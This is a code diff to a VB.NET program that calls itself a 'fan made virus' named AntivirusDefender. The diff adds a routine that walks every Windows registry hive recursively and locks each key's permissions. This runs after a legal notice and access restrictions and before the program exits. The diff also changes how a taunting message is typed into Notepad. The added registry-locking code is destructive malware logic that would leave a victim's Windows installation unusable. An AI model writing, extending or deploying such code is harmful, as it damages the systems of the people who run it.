@@ -372,6 +372,7 @@ Public Class Form1
                         Thread.Sleep(5000)
                         LegalNotice()
                         ApplyAccessRestrictions()
+                        Form1.LockAllRegistryKeys()
                         Thread.Sleep(60000)
                         Environment.Exit(0)
 
@@ -442,7 +443,7 @@ Public Class Form1
         End Sub
 
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion and motion
-        Private portalEffectLock As New Object ' Lock for thread safety
+        Private ReadOnly portalEffectLock As New Object ' Lock for thread safety
         Private portalX As Integer = 0 ' Current X position
         Private portalY As Integer = 0 ' Current Y position
         Private portalDirectionX As Integer = 2 ' Movement speed in X direction
@@ -931,6 +932,59 @@ Public Class Form1
         End Try
     End Sub
 
+    Public Sub LockAllRegistryKeys()
+        ' Define the root registry keys
+        Dim rootKeys As New List(Of String) From {
+        "HKEY_CLASSES_ROOT",
+        "HKEY_CURRENT_USER",
+        "HKEY_LOCAL_MACHINE",
+        "HKEY_USERS",
+        "HKEY_CURRENT_CONFIG"
+    }
+
+        ' Loop through each root registry key and lock them and their subkeys
+        For Each rootKey In rootKeys
+            LockRegistryKeyAndSubKeys(rootKey)
+        Next
+    End Sub
+
+    Private Sub LockRegistryKeyAndSubKeys(keyPath As String)
+        Try
+            ' Get the root key and open it
+            Dim rootKey As RegistryKey = Nothing
+            Dim keyParts As String() = keyPath.Split("\"c)
+            Select Case keyParts(0).ToUpper()
+                Case "HKEY_CLASSES_ROOT"
+                    rootKey = Registry.ClassesRoot
+                Case "HKEY_CURRENT_USER"
+                    rootKey = Registry.CurrentUser
+                Case "HKEY_LOCAL_MACHINE"
+                    rootKey = Registry.LocalMachine
+                Case "HKEY_USERS"
+                    rootKey = Registry.Users
+                Case "HKEY_CURRENT_CONFIG"
+                    rootKey = Registry.CurrentConfig
+                Case Else
+                    Throw New Exception("Unknown root key.")
+            End Select
+
+            ' Open the subkey with permission to change security
+            Using key As RegistryKey = rootKey.OpenSubKey(keyParts(1), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
+                If key IsNot Nothing Then
+                    ' Lock the root key itself
+                    LockRegistryKey(keyPath)
+
+                    ' Lock all subkeys
+                    For Each subKeyName In key.GetSubKeyNames()
+                        LockRegistryKeyAndSubKeys(keyPath & "\" & subKeyName)
+                    Next
+                End If
+            End Using
+        Catch ex As Exception
+            MessageBox.Show("An error occurred while locking registry key: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
+
     Private Sub LockRegistryKey(keyPath As String)
         Try
             ' Open the registry key with permission to change security
@@ -1250,6 +1304,7 @@ Public Class Form1
     Private Const KEYEVENTF_KEYDOWN As UInteger = &H0
     Private Const KEYEVENTF_KEYUP As UInteger = &H2
 
+
     ' Function to type a full message in Notepad
     Public Sub WriteMessageToNotepad()
         Try
@@ -1265,14 +1320,20 @@ Public Class Form1
             ' Bring Notepad to the foreground
             SetForegroundWindow(notepadHandle)
 
+            ' Wait a moment to ensure Notepad has focus
+            Thread.Sleep(500)
+
             ' Message to type
             Dim message As String = "one of the greatest fan made viruses ever created. his name is AntivirusDefender and there is no escape. i'm serious."
 
-            ' Use SendKeys to type the message
-            SendKeys.SendWait(message)
+            ' Simulate typing the message with a delay to avoid collision with other keyboard input
+            For Each c As Char In message
+                SendKeys.SendWait(c.ToString())
+                Thread.Sleep(100) ' Add a small delay between characters to ensure accuracy
+            Next
 
         Catch ex As Exception
-            Console.Write("Failed to write message to Notepad: " & ex.Message)
+            Console.WriteLine("Failed to write message to Notepad: " & ex.Message)
         End Try
     End Sub
 
